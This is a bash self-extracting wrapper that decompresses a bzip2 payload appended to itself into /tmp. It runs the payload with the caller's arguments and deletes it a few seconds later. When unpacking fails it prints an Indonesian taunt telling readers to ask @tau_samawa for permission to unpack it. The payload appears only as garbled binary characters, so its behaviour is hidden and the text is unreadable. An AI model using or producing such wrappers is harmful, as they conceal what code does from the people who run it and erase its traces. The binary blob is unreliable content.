#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�I�@ S�LtFDx���?��ο���`	��������z(	Vػ-�ĉ2��SM#Sz�z)��i� ��a3!0j�O� �#��4LFz5 !�2		�524i� 4  4h&�����i���  �   dɣ@h����`MbF� 0H�� D�%O§���M54=G� ����t�,3�
$�X��UAN.i�U�3y����xOj�`�lf�vBT� оK������)�D���gt����q���VFp�-%���w�N�N$"�6g�I1��6��5С��J�CQx9���=,���!m�i"��TAu�Aj?�����*^N�/���d���]���Ua���z�ռ��<HC�_�?E��O��R.@��m���m�g(�_gp�<Fۡ,E���ӂzm�_W#����� 4���*C8�(����]M�s�-L�ƃ��-��A�̔��:�4����n�~P�W��#��p,�B"\�Y�M�@ �+�[He7�q�m��} $;4�o�, B�!�����Iё��e��9慫��͚*0U/���b��a
IG�=���t��T��0������ő"ꜩCi�-�lƆ�X�#�)������d���֨�^����7�z:���T <N�X��X&��e�D�T�D�^b �z�+��G$�o'mG�U����00d�.I^�:��~ڴ��X���+q@��V�*g���_�gX3!A�F? פ&��e�J��4*�*��BګI0�A�R���)A">AU^Z�n�	>3Ʉ���~uP-qg�#��W�Z���!C���:�x��,�9�7�E�r;K݈CA*۪�5�6��v(�`睁y����z��C���ܹ�����p� �H���#n)9��`dC[h��N]��7�p��'tX&ZR���aO/�K�v/rR���+*�E��>a�R�Fy��7~/ˁh_瓘����I�R�OE<W�`����p	B�E������VShh�ZP�(�u�O.��Zc��2�Q�ic4H���|�s����D��h�po��@T��LZL+�i��g����ޛ�����CF��
ۿK�%vQ���eڀDY��18k�Yxu������2���@N���t�T!}����-��?�c;މ/�
3�T�"�� 8�c`�{c�V��qNX���G��ǧ4)ի-��]΍������P%�j��"�(F<�Njf��V���� �(�F�Sf��UM�7����(W-�T��/�<�xo����T�v�t�ÚڣHd͗P�nsr�w���YC����D�X�Jq�HJ.����OUkE��屩9č'W!.�!��DJ�o2g�롗2�1Xp_�64��9��K����{6M��,����@'D�.�\����x�˗7hV(d24��[kefnr�7y0��h���S�s.�ފ�F������?O���$x�c��3P���Hq3,��e������w0\�]��Rub1&,#(��4y�5�B�:&TÌ�C�[�� ��qԫ���6����fK���+eʒX���$�3*���T:�[ Ĕ&Ml�MX�dh�KH�`%��Rf/�Jh(���O�G1���j7�>`P�,D�Z�	
�	ȇ��A����p��U7+^������V#�*K"�&��X���n(AO�w7����Q�
�r(����'s���6o����r�{��(Ų�'=)Lg�Ha�����,i�`m\�!���'Ght�]�t`@�lf�V �j^� ��kR_�4cBg�b�]ZE�6ݑ&-�Ptu�C��ǴX�vҁe*M|�N��`�3v�xע����41�'0�(��E9@�C���$饢X�d��&�����k2[X0����8���4��0��%R��4��u�^�n�<X!�H�h 9]�Yq0�.FauW
���X��Ε/��E�6b7�m�eaQxg/1gj�'N+�vDT^�d\\W�a��k�}B ��Z�C��Clj�Ԍ��>�5�ZpR]l�غ0̡��4­e��Y����"�(H~$�  